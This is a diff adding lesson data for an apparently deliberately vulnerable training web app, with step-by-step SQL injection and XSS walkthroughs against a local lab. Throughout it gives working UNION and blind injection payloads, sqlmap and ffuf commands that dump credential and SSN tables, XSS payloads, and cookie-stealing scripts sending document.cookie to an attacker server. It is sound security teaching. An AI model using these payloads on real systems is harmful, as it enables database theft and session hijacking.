+    badgeClass: "vuln-sqli",
+    description: "Make the database do things it was never meant to do.",
+    vulns: [
+        {
+            id: "sqli-union-products",
+            name: "UNION-Based SQLi (Product Search)",
+            difficulty: "Medium",
+            steps: [
+                `<p class="wt-mentor-text">Login bypass was fun, but UNION injection lets you actually extract data from the database. Let's go shopping.</p>
+                <p>Head to <a href="/products" target="_blank">Products</a> and use the search bar.</p>`,
+
+                `<p class="wt-mentor-text">Search for something and look at the results. Your search term appears in the page, and the results come from a database query. Try a single quote to see if it breaks.</p>
+                <p>Search for <code>'</code> and see what happens. An error or empty results with odd behavior means SQL injection.</p>`,
+
+                `<p class="wt-mentor-text">First, find the column count. The UNION requires the same number of columns as the original query.</p>
+                <p>Try these searches one at a time:</p>
+                <pre>' UNION SELECT null-- </pre>
+                <pre>' UNION SELECT null,null-- </pre>
+                <pre>' UNION SELECT null,null,null-- </pre>
+                <pre>' UNION SELECT null,null,null,null-- </pre>
+                <pre>' UNION SELECT null,null,null,null,null-- </pre>
+                <p>When you stop getting errors, you found the column count. Then extract data:</p>
+                <pre>' UNION SELECT id,username,password,email,role FROM users-- </pre>`,
+
+                `<p class="wt-mentor-text">The product results table now shows user data. You should see usernames, password hashes or plaintext passwords, emails, and roles for every user in the database.</p>
+                <p>The data appears in the product name, price, and description columns since they map to the UNION columns.</p>`,
+
+                `<p class="wt-mentor-text">Here is the backend query:</p>
+                <pre>SELECT * FROM products WHERE name LIKE '%INPUT%'</pre>
+                <p>By injecting <code>' UNION SELECT ...</code>, you close the LIKE clause and append a second query. The database runs both and combines the results. The UNION must have the same number of columns (5 in this case), which is why we had to figure that out first.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/products" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-search"></i> Go to Product Search</a>
+                </div>
+                <p class="mt-3"><strong>Extra challenges:</strong></p>
+                <ul>
+                    <li>Can you extract the SQLite version? Try <code>' UNION SELECT sqlite_version(),null,null,null,null--</code></li>
+                    <li>Can you list all tables? Try <code>' UNION SELECT name,sql,null,null,null FROM sqlite_master--</code></li>
+                    <li>Can you dump the employees table with SSNs and salaries?</li>
+                </ul>`,
+
+                `<p class="wt-mentor-text">sqlmap makes this trivial. This is the best endpoint for sqlmap because the search page renders full table output.</p>
+                <p><strong>Enumerate tables:</strong></p>
+                <pre>sqlmap -u "http://localhost:5000/products/search?q=test" \\
+  --cookie="session=YOUR_SESSION" \\
+  --batch --tables</pre>
+                <p><strong>Dump the users table:</strong></p>
+                <pre>sqlmap -u "http://localhost:5000/products/search?q=test" \\
+  --cookie="session=YOUR_SESSION" \\
+  --batch -T users --dump</pre>
+                <p><strong>Dump employees (SSNs, salaries):</strong></p>
+                <pre>sqlmap -u "http://localhost:5000/products/search?q=test" \\
+  --cookie="session=YOUR_SESSION" \\
+  --batch -T employees --dump</pre>
+                <p>This is the fastest SQLi endpoint because sqlmap can use UNION technique here (full output visible on page). Compare this to <code>/products/filter</code> which needs blind techniques.</p>`
+            ]
+        },
+        {
+            id: "sqli-union-employees",
+            name: "UNION-Based SQLi (Employee Search)",
+            difficulty: "Medium",
+            steps: [
+                `<p class="wt-mentor-text">You cracked the product search. Now build the habit: every time you find SQLi on one search feature, check every other search feature in the app. Different tables often have different column counts, which teaches you about the database structure.</p>
+                <p>Go to <a href="/employees" target="_blank">Employees</a> and find the search bar.</p>`,
+
+                `<p class="wt-mentor-text">Start the same way you always should: drop a single quote <code>'</code> into the search and submit. Does the page error, return empty results, or behave oddly? That tells you whether the input reaches a SQL query.</p>
+                <p>Once you confirm injection, you need the column count again. But here is the thing: the employee table is wider than the products table. Products had 5 columns. Employees will have more because of fields like SSN, salary, address, department.</p>`,
+
+                `<p class="wt-mentor-text">Start counting columns. This is where patience pays off:</p>
+                <pre>' UNION SELECT null,null,null,null,null-- </pre>
+                <p>Error. Not enough columns. Keep adding nulls:</p>
+                <pre>' UNION SELECT null,null,null,null,null,null,null-- </pre>
+                <p>Still error. More:</p>
+                <pre>' UNION SELECT null,null,null,null,null,null,null,null,null-- </pre>
+                <p>It works at 9 columns. Now you know the employees table has 9 columns. Replace the nulls with data you want to extract. The trick is figuring out which UNION column maps to which display column on the page. Try putting distinct values in each position:</p>
+                <pre>' UNION SELECT 'A','B','C','D','E','F','G','H','I' FROM users-- </pre>
+                <p>Look at where A, B, C appear on the page. That tells you which positions are visible, so you know where to put <code>username</code>, <code>password</code>, etc.:</p>
+                <pre>' UNION SELECT id,username,password,email,role,null,null,null,null FROM users-- </pre>`,
+
+                `<p class="wt-mentor-text">The employee results table now shows user credentials instead of employee data. Each UNION column fills a different display column. Once you know the mapping, you can extract any table's data through this endpoint.</p>`,
+
+                `<p class="wt-mentor-text">The column-counting skill is something you will use on every UNION injection. Different tables = different column counts. When you move from one search feature to another, you often need to recount. This teaches you the database schema as you go - the number and order of columns reveals the table structure even without seeing the query.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/employees/search?q=test" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-search"></i> Go to Employee Search</a>
+                </div>`,
+
+                `<p class="wt-mentor-text">sqlmap works the same way on every search endpoint. Just change the URL.</p>
+                <pre>sqlmap -u "http://localhost:5000/employees/search?q=test" \\
+  --cookie="session=YOUR_SESSION" \\
+  --batch --level=3 -T users --dump</pre>
+                <p><strong>Why <code>--level=3</code>?</strong> This search uses a LIKE query (<code>WHERE name LIKE '%input%'</code>). At the default level, sqlmap's payloads do not account for the surrounding <code>%</code> wildcards and fail to detect the injection. Level 3 includes LIKE-specific tests that handle this context.</p>`
+            ]
+        },
+        {
+            id: "sqli-union-tickets",
+            name: "UNION-Based SQLi (Ticket Search)",
+            difficulty: "Medium",
+            steps: [
+                `<p class="wt-mentor-text">Let's build a systematic approach. You have found SQLi on products and employees. How do you find all the remaining injection points without guessing? Map the application first.</p>
+                <p>Click through the nav bar and note every feature that has a search box, filter dropdown, or sort option. The support section at <a href="/support" target="_blank">Support</a> has a search - let's test it.</p>`,
+
+                `<p class="wt-mentor-text">Before you even touch the search, think about what you know. The app uses SQLite (you confirmed that from previous injections). Every search so far has used a LIKE query. This one probably does too.</p>
+                <p>Drop a single quote in <code>/support/search?q='</code>. Error or weird behavior? Good, it is injectable. Now you need the column count - and here is the important thing: the tickets table has a different number of columns than products (5) or employees (9). You need to discover it.</p>`,
+
+                `<p class="wt-mentor-text">Count the columns. Start at 5 (you know products was 5), then try 7, then adjust:</p>
+                <pre>' UNION SELECT null,null,null,null,null,null,null-- </pre>
+                <p>Once it works, you know the tickets table has 7 columns. Now extract - but notice something: you have found three different column counts (5, 9, 7). Each one reveals the structure of a different database table. You are building a mental map of the schema through injection alone.</p>
+                <pre>' UNION SELECT id,username,password,email,role,null,null FROM users-- </pre>`,
+
+                `<p class="wt-mentor-text">Another full dump through yet another endpoint. At this point you should be thinking: every LIKE-based search in this app is likely vulnerable.</p>
+                <p>This is three separate SQLi findings for your report. In bug bounties, each unique endpoint with the same vulnerability type counts separately because they need to be fixed independently.</p>`,
+
+                `<p class="wt-mentor-text">The broader lesson: search functionality uses LIKE queries, and LIKE queries are a top injection vector because developers often forget to parameterize them. Your methodology should be: find every search box, filter, and sort parameter in the app, and test each one. Also test URL parameters like <code>?sort=name</code>, <code>?order=asc</code>, and <code>?category=value</code> - these often build dynamic SQL too.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/support/search?q=test" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-search"></i> Go to Ticket Search</a>
+                </div>`,
+
+                `<p class="wt-mentor-text">Same sqlmap command, different URL. Same LIKE context, so you need <code>--level=3</code> here too.</p>
+                <pre>sqlmap -u "http://localhost:5000/support/search?q=test" \\
+  --cookie="session=YOUR_SESSION" \\
+  --batch --level=3 -T users --dump</pre>
+                <p><strong>Pro tip:</strong> Once you find one SQLi endpoint that works with sqlmap, use it for all your extraction. No need to run sqlmap on every endpoint. But for your report, document each one as a separate finding.</p>`
+            ]
+        },
+        {
+            id: "sqli-blind-filter",
+            name: "Blind Boolean SQLi (Product Filter)",
+            difficulty: "Hard",
+            steps: [
+                `<p class="wt-mentor-text">Not all SQL injection gives you visible output. Sometimes you have to ask the database yes/no questions. This is called blind SQLi.</p>
+                <p>Go to <a href="/products" target="_blank">Products</a> and look for a filter or category parameter.</p>`,
+
+                `<p class="wt-mentor-text">Try <code>/products/filter?category=Electronics</code>. You get products. Now try <code>/products/filter?category=Electronics' AND '1'='1</code>. Still get products? Try <code>Electronics' AND '1'='2</code>. No products?</p>
+                <p>If the results change based on your condition, that is boolean-based blind SQLi.</p>`,
+
+                `<p class="wt-mentor-text">You can extract data one character at a time by asking true/false questions:</p>
+                <pre>/products/filter?category=Electronics' AND SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a'-- </pre>
+                <p>If products appear, the first character of admin's password is 'a'. If not, try 'b', 'c', etc.</p>
+                <p>This is slow manually but tools like sqlmap automate it:</p>
+                <pre>sqlmap -u "http://localhost:5000/products/filter?category=test" --technique=B --dump</pre>`,
+
+                `<p class="wt-mentor-text">By testing each character position, you can extract the entire database contents. It takes many requests, but it works even when you cannot see the SQL output directly.</p>`,
+
+                `<p class="wt-mentor-text">Blind SQLi works because the application behavior changes based on whether the injected condition is true or false.</p>
+                <p>Products appear = true condition. No products = false condition. This binary signal lets you ask any yes/no question to the database. It is slower than UNION injection but equally powerful.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/products/filter?category=Electronics" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-funnel"></i> Go to Product Filter</a>
+                </div>`,
+
+                `<p class="wt-mentor-text">This is where sqlmap saves you hours of manual work.</p>
+                <p><strong>Important:</strong> This endpoint truncates long output, so UNION technique fails. You must force blind:</p>
+                <pre>sqlmap -u "http://localhost:5000/products/filter?category=Networking" \\
+  --cookie="session=YOUR_SESSION" \\
+  --batch --technique=B -T users --dump</pre>
+                <p><strong>Why <code>--technique=B</code>?</strong> Without it, sqlmap tries UNION first, gets truncated output, and either fails or gives partial results. Boolean blind asks one yes/no question per request and does not care about output length.</p>
+                <p><strong>Speed tip:</strong> Blind is slow. If you just need to confirm the vuln for your report, run without <code>--dump</code> first. Only dump when you actually need the data. Or use the <code>/products/search</code> endpoint for fast UNION extraction instead.</p>
+                <p>You can also use <strong>ffuf</strong> for manual blind extraction like you did with the bb-labs exercise:</p>
+                <pre>ffuf -u "http://localhost:5000/products/filter?category=Networking'+AND+SUBSTR((SELECT+password+FROM+users+WHERE+username%3D'admin'),1,1)%3D'FUZZ'--+" \\
+  -w <(echo -e "a\nb\nc\nd\ne\nf\n1\n2\n3") \\
+  -H "Cookie: session=YOUR_SESSION" \\
+  -fs WRONG_SIZE</pre>`
+            ]
+        },
+        {
+            id: "sqli-second-order",
+            name: "Second-Order SQLi",
+            difficulty: "Hard",
+            steps: [
+                `<p class="wt-mentor-text">This one is tricky. The injection does not fire immediately. Instead, malicious data is stored and executed later when another feature uses it.</p>
+                <p>Go to <a href="/register" target="_blank">/register</a> and create a new account.</p>`,
+
+                `<p class="wt-mentor-text">The registration safely stores your username. But what if the profile page uses that stored username in another SQL query without sanitizing it?</p>
+                <p>The username you choose is saved, and when you view your profile, it gets used in a new query.</p>`,
+
+                `<p class="wt-mentor-text">Here is the tricky part. The profile page runs this query with your stored username:</p>
+                <pre>SELECT * FROM support_tickets WHERE user_id = (SELECT id FROM users WHERE username = 'YOUR_USERNAME')</pre>
+                <p>Notice the subquery has a closing parenthesis <code>)</code>. Your payload needs to close that paren. Register with this username:</p>
+                <pre>x') UNION SELECT 1,username,password,email,role,6,7 FROM users--</pre>
+                <p>Use any password. The registration is safe (parameterized queries), so the payload just gets stored as-is.</p>
+                <p><strong>Important:</strong> Do NOT try to log in with this username. The login query has 13 columns, not 7, so the UNION will break it. Instead, log in as a normal user (or use SQLi bypass like <code>agarcia'--</code>) and use IDOR to visit the malicious user's profile.</p>`,
+
+                `<p class="wt-mentor-text">After registering, log in as any normal user. Then visit the malicious user's profile via IDOR: <code>/profile/USER_ID</code>.</p>
+                <p>When the profile loads, the activity query fires:</p>
+                <pre>SELECT * FROM support_tickets WHERE user_id = (SELECT id FROM users WHERE username = 'x') UNION SELECT 1,username,password,email,role,6,7 FROM users--')</pre>
+                <p>The Recent Activity section now shows all usernames and passwords from the users table, disguised as "ticket" entries. You should see entries like:</p>
+                <pre>Ticket: admin123 (admin)
+Ticket: password123 (employee)
+Ticket: Welcome1! (employee)</pre>
+                <p>Those are passwords and roles, not ticket data.</p>`,
+
+                `<p class="wt-mentor-text">This is called second-order SQLi because the payload is stored in step 1 (registration) but executed in step 2 (profile view). Two features, two different queries.</p>
+                <p>The registration uses parameterized queries (safe), but the profile page builds a query using the stored username with string concatenation (unsafe). The key insight was closing the subquery parenthesis with <code>')</code> before adding the UNION.</p>
+                <p><strong>Can you automate this with sqlmap?</strong> No. Sqlmap's <code>--second-url</code> flag exists for second-order SQLi, but it cannot handle the multi-step chain here (register, then log in as a different user, then visit the new user's profile via IDOR). This is a manual-only finding. That is exactly why second-order SQLi is rated Hard.</p>
+                <p>The key lesson: every query that uses stored data needs to be parameterized, not just the ones that directly handle user input.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/register" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-person-plus"></i> Go to Register</a>
+                </div>
+                <p class="mt-3"><strong>Steps summary:</strong></p>
+                <ol>
+                    <li>Register with username: <code>x') UNION SELECT 1,username,password,email,role,6,7 FROM users--</code></li>
+                    <li>Log in as a normal user (e.g. <code>agarcia</code> / <code>Welcome1!</code>)</li>
+                    <li>Find the new user's ID (check <code>/admin</code> or try sequential IDs)</li>
+                    <li>Visit <code>/profile/ID</code> to trigger the second-order injection</li>
+                </ol>`
+            ]
+        },
+        {
+            id: "sqli-api-blind",
+            name: "API Blind SQLi",
+            difficulty: "Hard",
+            steps: [
+                `<p class="wt-mentor-text">APIs are just as vulnerable as web pages. Let's check the user lookup endpoint.</p>
+                <p>The API has an endpoint at <code>/api/v1/users/check?username=admin</code>. It returns JSON: <code>{"exists": true}</code> or <code>{"exists": false}</code>.</p>`,
+
+                `<p class="wt-mentor-text">That true/false response is perfect for blind SQLi. Try:</p>
+                <p><code>/api/v1/users/check?username=admin' AND '1'='1</code> vs <code>admin' AND '1'='2</code>.</p>
+                <p>If you get <code>true</code> for the first and <code>false</code> for the second, you have blind injection.</p>`,
+
+                `<p class="wt-mentor-text">Use curl for API testing:</p>
+                <pre>curl "http://localhost:5000/api/v1/users/check?username=admin'+AND+SUBSTR((SELECT+password+FROM+users+WHERE+username%3D'admin'),1,1)%3D'a'--+"</pre>
+                <p>Or use sqlmap:</p>
+                <pre>sqlmap -u "http://localhost:5000/api/v1/users/check?username=admin" --level=3 --technique=B --batch</pre>`,
+
+                `<p class="wt-mentor-text">The JSON response toggles between true and false based on your injected condition. You can extract the entire database through this boolean channel.</p>`,
+
+                `<p class="wt-mentor-text">API endpoints are often overlooked in security testing because they do not have a visible web interface. But they use the same backend queries and are just as vulnerable. Always test API parameters the same way you test form inputs.</p>`,
+
+                `<div class="wt-try-box">
+                    <p>Test with curl in your terminal:</p>
+                    <pre>curl "http://localhost:5000/api/v1/users/check?username=admin"</pre>
+                </div>`,
+
+                `<p class="wt-mentor-text">sqlmap handles API endpoints just like web pages.</p>
+                <pre>sqlmap -u "http://localhost:5000/api/v1/users/check?username=admin" \\
+  --batch --level=3 --technique=B -T users --dump</pre>
+                <p><strong>Important:</strong> Use <code>username=admin</code> (a known valid user), not <code>username=test</code>. sqlmap needs a "true" baseline to detect boolean differences. With <code>test</code>, the response is always <code>{"exists": false}</code> and sqlmap cannot distinguish true from false conditions. <code>--level=3</code> is needed because the default level does not try enough payload variants for this endpoint.</p>
+                <p><strong>Cookie injection on other labs:</strong> Remember the bb-labs exercise where the session cookie was injectable? For that pattern:</p>
+                <pre>sqlmap -u "http://target/page" \\
+  --cookie="session=VULNERABLE_VALUE" \\
+  -p session --batch --dump</pre>
+                <p>The <code>-p</code> flag tells sqlmap which parameter to test. Works for cookies, headers, or URL params.</p>`
+            ]
+        }
+    ]
+},
+{
+    id: "xss",
+    name: "Cross-Site Scripting (XSS)",
+    icon: "bi-code-slash",
+    badgeClass: "vuln-xss",
+    description: "Inject JavaScript that runs in other users' browsers.",
+    vulns: [
+        {
+            id: "xss-reflected-search",
+            name: "Reflected XSS (Product Search)",
+            difficulty: "Easy",
+            steps: [
+                `<p class="wt-mentor-text">XSS is about injecting JavaScript into a page. Reflected XSS means your payload bounces right back in the response. Let's find one.</p>
+                <p>Go to <a href="/products" target="_blank">Products</a> and use the search bar.</p>`,
+
+                `<p class="wt-mentor-text">Search for something like <code>test</code> and look at the results page. Notice that your search term appears on the page: "Results for: test". Is it being escaped, or is it rendered as raw HTML?</p>
+                <p>Try searching for <code>&lt;b&gt;test&lt;/b&gt;</code>. If "test" appears bold, the input is rendered as HTML.</p>`,
+
+                `<p class="wt-mentor-text">Search for this:</p>
+                <pre>&lt;script&gt;alert('XSS')&lt;/script&gt;</pre>
+                <p>Or if script tags are filtered, try:</p>
+                <pre>&lt;img src=x onerror=alert('XSS')&gt;</pre>`,
+
+                `<p class="wt-mentor-text">You should see a JavaScript alert popup. That means your code executed in the browser. In a real attack, you would steal cookies, redirect users, or modify the page content.</p>`,
+
+                `<p class="wt-mentor-text">The search query is reflected in the page using the <code>|safe</code> Jinja2 filter, which disables HTML escaping. Normally, Jinja2 auto-escapes output (turning &lt; into &amp;lt;), but <code>|safe</code> tells it "trust this content." When user input is marked as safe, XSS happens.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/products/search?q=test" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-search"></i> Go to Product Search</a>
+                </div>
+                <p class="mt-3"><strong>Extra challenge:</strong> Craft a URL that steals cookies: <code>&lt;script&gt;document.location='http://YOUR_SERVER/?c='+document.cookie&lt;/script&gt;</code></p>`
+            ]
+        },
+        {
+            id: "xss-reflected-news",
+            name: "Reflected XSS (News Tags)",
+            difficulty: "Easy",
+            steps: [
+                `<p class="wt-mentor-text">You found reflected XSS in the search box. Now let's hunt for more. The key technique: look at every URL parameter the app uses and check if its value appears on the page.</p>
+                <p>Go to <a href="/news" target="_blank">News</a>. Click around and watch the URL bar. Do you see any query parameters like <code>?tag=</code>, <code>?category=</code>, or <code>?filter=</code>?</p>`,
+
+                `<p class="wt-mentor-text">Navigate to <code>/news?tag=Technology</code>. The tag name appears somewhere on the page (maybe as a heading like "Posts tagged: Technology"). Now here is the method: right-click, View Source, and search for "Technology" in the HTML. Is your input inside an HTML tag attribute? Inside plain text? Inside a JavaScript block?</p>
+                <p>Where the reflection appears determines what payload you need. If it is in plain HTML, try <code>?tag=&lt;b&gt;test&lt;/b&gt;</code>. If "test" appears bold, the input is rendered as raw HTML.</p>`,
+
+                `<p class="wt-mentor-text">Confirmed - no escaping. Now escalate:</p>
+                <pre>/news?tag=&lt;script&gt;alert('XSS')&lt;/script&gt;</pre>
+                <p>If script tags are stripped, try event handlers:</p>
+                <pre>/news?tag=&lt;img src=x onerror=alert('XSS')&gt;</pre>`,
+
+                `<p class="wt-mentor-text">The alert fires. Now think about exploitability: this is a URL you can send to someone. Craft a link like <code>http://thyhe.com/news?tag=&lt;script&gt;...&lt;/script&gt;</code>, and anyone who clicks it runs your JavaScript in their browser. That is why reflected XSS is exploitable even though the payload is not stored - the URL itself is the weapon.</p>`,
+
+                `<p class="wt-mentor-text">URL parameters that get reflected on the page are the bread and butter of reflected XSS hunting. Your methodology: for every page, check the URL for parameters, view the page source, search for your input value, and test if it is escaped. Common culprits: <code>?search=</code>, <code>?tag=</code>, <code>?q=</code>, <code>?redirect=</code>, <code>?msg=</code>, <code>?error=</code>. Each one is worth a quick test.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/news?tag=Technology" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-newspaper"></i> Go to News</a>
+                </div>`
+            ]
+        },
+        {
+            id: "xss-reflected-error",
+            name: "Reflected XSS (Error Page)",
+            difficulty: "Easy",
+            steps: [
+                `<p class="wt-mentor-text">Here is a hunting technique that many beginners miss: always check error pages. Developers build custom error pages to look nice, and they often pass the error message through a URL parameter. Those pages get less security review because they feel like "just error handling."</p>
+                <p>Try visiting <code>/error?msg=Something went wrong</code>. How did you find this endpoint? In a real app, trigger errors on purpose (submit invalid data, visit broken links) and watch if the URL contains a <code>msg</code>, <code>error</code>, or <code>message</code> parameter.</p>`,
+
+                `<p class="wt-mentor-text">The message appears on the page. View the source and search for "Something went wrong" in the HTML. Is it inside a <code>&lt;p&gt;</code> tag? Is there any encoding? Try <code>/error?msg=&lt;b&gt;test&lt;/b&gt;</code> - if "test" is bold, the parameter is rendered as raw HTML.</p>`,
+
+                `<p class="wt-mentor-text">No escaping. Escalate:</p>
+                <pre>/error?msg=&lt;script&gt;alert('XSS')&lt;/script&gt;</pre>
+                <p>This payload also works and is harder to spot in a URL because it uses URL encoding:</p>
+                <pre>/error?msg=%3Cscript%3Ealert('XSS')%3C/script%3E</pre>`,
+
+                `<p class="wt-mentor-text">The alert fires. Error pages are a favorite target in bug bounties because they are ubiquitous (every app has them) and often overlooked in security reviews. Developers mark them <code>|safe</code> because they want to display formatted HTML error messages like "The <b>email</b> field is required."</p>`,
+
+                `<p class="wt-mentor-text">Add this to your testing checklist: whenever you find a custom error page, check for reflected XSS. Also try 404 pages (<code>/nonexistent-page</code>) - some apps reflect the requested path in the 404 message. And check pages that show "access denied" or "unauthorized" messages with URL parameters. These forgotten corners of an app are where easy XSS wins hide.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/error?msg=Test%20error" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-exclamation-triangle"></i> Go to Error Page</a>
+                </div>`
+            ]
+        },
+        {
+            id: "xss-stored-bio",
+            name: "Stored XSS (Profile Bio)",
+            difficulty: "Medium",
+            steps: [
+                `<p class="wt-mentor-text">Stored XSS is more dangerous than reflected because the payload persists. Anyone who views the page gets hit. Let's try the profile bio.</p>
+                <p>Go to <a href="/profile/edit" target="_blank">Edit Profile</a>.</p>`,
+
+                `<p class="wt-mentor-text">The bio field accepts free text. When you view a profile, the bio is displayed. Is it escaped? Check by entering some HTML like <code>&lt;b&gt;test&lt;/b&gt;</code> and viewing the profile.</p>`,
+
+                `<p class="wt-mentor-text">Edit your bio to include:</p>
+                <pre>&lt;script&gt;alert('Stored XSS')&lt;/script&gt;</pre>
+                <p>Save it, then view your profile.</p>`,
+
+                `<p class="wt-mentor-text">The alert fires every time anyone views your profile. The payload is stored in the database and executed for every visitor.</p>`,
+
+                `<p class="wt-mentor-text">Stored XSS persists in the database. The bio is saved as-is and rendered with <code>|safe</code>. Unlike reflected XSS (which requires a crafted URL), stored XSS attacks everyone who views the affected page. This makes it higher severity.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/profile/edit" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-pencil"></i> Go to Edit Profile</a>
+                </div>`
+            ]
+        },
+        {
+            id: "xss-stored-review",
+            name: "Stored XSS (Product Reviews)",
+            difficulty: "Medium",
+            steps: [
+                `<p class="wt-mentor-text">Product reviews are user-generated content that gets displayed to every visitor. Anywhere users can write text that other users see is a stored XSS candidate.</p>
+                <p>Go to <a href="/products" target="_blank">Products</a>, pick any product, and find the review form at the bottom of the detail page.</p>`,
+
+                `<p class="wt-mentor-text">Before trying XSS payloads, do the quick HTML test. Submit a review with <code>&lt;b&gt;bold test&lt;/b&gt;</code> as the content. Then look at how your review appears on the page. Is "bold test" displayed in bold? If so, HTML is rendering - which means JavaScript will too.</p>
+                <p>This two-step approach (test with harmless HTML first, then escalate) is cleaner than jumping straight to <code>&lt;script&gt;</code> tags. It also avoids triggering any basic WAF that might be looking for script tags.</p>`,
+
+                `<p class="wt-mentor-text">Now let's learn a technique that bypasses basic script tag filters. Instead of <code>&lt;script&gt;</code>, use an image tag with an error handler:</p>
+                <pre>&lt;img src=x onerror=alert('XSS in review')&gt;</pre>
+                <p>How does this work? The browser tries to load an image from the URL "x". That fails (there is no image at "x"). When it fails, the browser fires the <code>onerror</code> event handler, which runs your JavaScript. This works because <code>onerror</code> is a legitimate HTML attribute that triggers JavaScript - the browser has no way to know you are using it maliciously.</p>`,
+
+                `<p class="wt-mentor-text">The alert fires for every visitor who views this product page. Unlike reflected XSS where you need to trick someone into clicking a link, stored XSS fires automatically. Every customer browsing products gets hit.</p>
+                <p>Refresh the page and the alert fires again - the payload is saved in the database permanently (until someone removes it).</p>`,
+
+                `<p class="wt-mentor-text">The <code>&lt;img onerror&gt;</code> technique is essential to know because many apps filter <code>&lt;script&gt;</code> tags but forget about event handlers. Other useful event handler payloads: <code>&lt;svg onload=alert(1)&gt;</code>, <code>&lt;body onload=alert(1)&gt;</code>, <code>&lt;input onfocus=alert(1) autofocus&gt;</code>. There are dozens of HTML elements with event attributes that execute JavaScript. A blocklist approach can never catch them all.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/products" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-star"></i> Go to Products</a>
+                </div>`
+            ]
+        },
+        {
+            id: "xss-stored-ticket",
+            name: "Stored XSS (Support Tickets)",
+            difficulty: "Medium",
+            steps: [
+                `<p class="wt-mentor-text">Support tickets are read by staff. Imagine planting XSS that fires when an admin reads your ticket.</p>
+                <p>Go to <a href="/support/create" target="_blank">Create a Support Ticket</a>.</p>`,
+
+                `<p class="wt-mentor-text">The title and content fields are both rendered on the ticket view page. Are they escaped?</p>`,
+
+                `<p class="wt-mentor-text">Create a ticket with this title:</p>
+                <pre>&lt;script&gt;alert('XSS in ticket title')&lt;/script&gt;</pre>
+                <p>And this content:</p>
+                <pre>&lt;img src=x onerror=alert('XSS in ticket body')&gt;</pre>`,
+
+                `<p class="wt-mentor-text">Both the title and body execute JavaScript. In a real scenario, this would steal the admin's session cookie when they open the ticket.</p>`,
+
+                `<p class="wt-mentor-text">This is particularly dangerous because support tickets are typically read by higher-privileged users (support staff, admins). An attacker submits a ticket, the admin opens it, and the XSS steals their session. This can escalate a low-privilege account to admin access.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/support/create" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-plus-circle"></i> Create a Ticket</a>
+                </div>`
+            ]
+        },
+        {
+            id: "xss-stored-message",
+            name: "Stored XSS (Messages)",
+            difficulty: "Medium",
+            steps: [
+                `<p class="wt-mentor-text">Here is where stored XSS gets really dangerous: targeted attacks through private messages. Unlike reviews or comments (where you hit everyone), messages let you choose your victim.</p>
+                <p>Think about who you want to target. The admin? A support agent? Go to <a href="/messages/send" target="_blank">Send Message</a>.</p>`,
+
+                `<p class="wt-mentor-text">Before you send a payload, think about the attack chain. Your goal is not just to pop an alert - it is to steal the recipient's session cookie. Here is the plan:</p>
+                <ol>
+                    <li>Send a message with XSS that steals the cookie</li>
+                    <li>The victim (say, admin) opens the message</li>
+                    <li>Your JavaScript sends the admin's cookie to your server</li>
+                    <li>You use that cookie to log in as admin</li>
+                </ol>
+                <p>To test if messages are vulnerable, first send a message with <code>&lt;b&gt;test&lt;/b&gt;</code> as the body. Then view the message - if "test" is bold, you have stored XSS.</p>`,
+
+                `<p class="wt-mentor-text">For a proof of concept, send a message with:</p>
+                <pre>&lt;script&gt;alert('Your messages are not safe')&lt;/script&gt;</pre>
+                <p>For an actual cookie theft payload (in a real pentest with a listener on your machine):</p>
+                <pre>&lt;script&gt;new Image().src='http://YOUR_IP:8888/?c='+document.cookie&lt;/script&gt;</pre>
+                <p>The <code>new Image().src</code> trick makes the browser send a request to your server with the cookie in the URL, without any visible indication to the victim.</p>`,
+
+                `<p class="wt-mentor-text">The alert fires (or the cookie gets sent) the moment the recipient opens your message. This is a targeted attack - you control who gets hit and when. The victim sees a normal-looking message in their inbox and has no reason to suspect anything.</p>`,
+
+                `<p class="wt-mentor-text">This attack pattern - stored XSS in messages to steal admin sessions - is one of the most impactful and commonly reported chains in bug bounties. It combines a medium-severity finding (stored XSS) with account takeover (critical severity). When writing your report, always demonstrate the full chain, not just the alert box. Show that you can steal the cookie and use it. That is what bumps the severity from medium to critical.</p>`,
+
+                `<div class="wt-try-box">
+                    <a href="/messages/send" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-envelope"></i> Send a Message</a>
+                </div>`
+            ]
+        },
+        {
+            id: "xss-dom-hash",
+            name: "DOM-Based XSS (News Hash)",
+            difficulty: "Medium",
+            steps: [
+                `<p class="wt-mentor-text">DOM XSS is different. The server never sees the payload. It happens entirely in the browser's JavaScript. Let's find one.</p>
+                <p>Go to <a href="/news" target="_blank">News</a> and look at the page source (Ctrl+U or View Source).</p>`,
+
+                `<p class="wt-mentor-text">Search the JavaScript code for <code>innerHTML</code>, <code>document.write</code>, or <code>eval</code>. These are "sinks" where user input can become executable code.</p>
+                <p>In the news page, there is JavaScript that reads the URL hash (<code>window.location.hash</code>) and puts it into the page using <code>innerHTML</code>.</p>`,
+
+                `<p class="wt-mentor-text">Try this URL:</p>
+                <pre>/news#&lt;img src=x onerror=alert('DOM XSS')&gt;</pre>
+                <p>The hash value is read by JavaScript and injected into the page without sanitization.</p>`,
+
+                `<p class="wt-mentor-text">The alert fires. The hash fragment never gets sent to the server, so server-side filtering cannot stop this.</p>`,
+
+                `<p class="wt-mentor-text">DOM XSS occurs when client-side JavaScript takes user-controlled data (URL hash, query params, document.referrer) and passes it to a dangerous function (innerHTML, document.write, eval). The fix is to use <code>textContent</code> instead of <code>innerHTML</code>, or sanitize the input with a library like DOMPurify.</p>`,
+
+                `<div class="wt-try-box">
